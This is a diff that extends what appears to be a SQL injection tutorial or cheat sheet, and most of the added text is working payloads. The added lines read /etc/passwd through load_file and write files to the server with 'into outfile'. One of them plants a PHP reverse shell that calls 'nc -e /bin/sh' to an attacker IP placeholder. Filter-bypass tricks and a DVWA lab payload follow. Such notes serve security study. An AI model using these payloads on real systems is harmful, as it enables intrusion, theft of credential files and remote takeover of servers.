@@ -68,8 +68,20 @@ version()
 And here an example of how to retrieve them:
 
 ```
-# if injectable columns are number 2, 3 and 4
+# if injectable columns are number 2, 3 and 4 you can display some info from the system
 union select 1, database(),user(),version(),5
+
+# Extra bonus
+# You can also load a file from the system with
+union select 1, load_file(/etc/passwd),3,4,5
+
+# and you can try to write to a file in the server
+union select 1,'example example',3,4,5 into outfile '/var/www/path/to/file.txt'
+union select 1,'example example',3,4,5 into outfile '/tmp/file.txt'
+
+# and we can combine that with a reverse shell like
+union select 1,'<?passthru("nc -e /bin/sh <attacker IP> <attacker port>") ?>', 3,4,5 into outfile '/tmp/reverse.php'
+
 ```
 
 
@@ -88,3 +100,24 @@ substring() returns a substring of the given argument. It takes three parameters
 ### Extra Bonus: Bypassing quotation marks
 
 Sometimes quotation marks get filtered in SQL queries. To bypass that when querying some tablename, maybe we can skip quotation marks by entering tablename directly in HEX values.
+
+More bypassing tips:
+
+```
+# Using mingled upper and lowercase
+
+# Using spaces url encoded
++
+
+# Using comments
+/**/
+/**
+--
+; --
+; /*
+; //
+
+# Example of bypassing webpages that only displays one value at a time
+1'+uNioN/**/sEleCt/**/table_name,2+fROm+information_schema.tables+where+table_schema?'dvwa'+limit+1,1%23&Submit=Submit#
+
+```
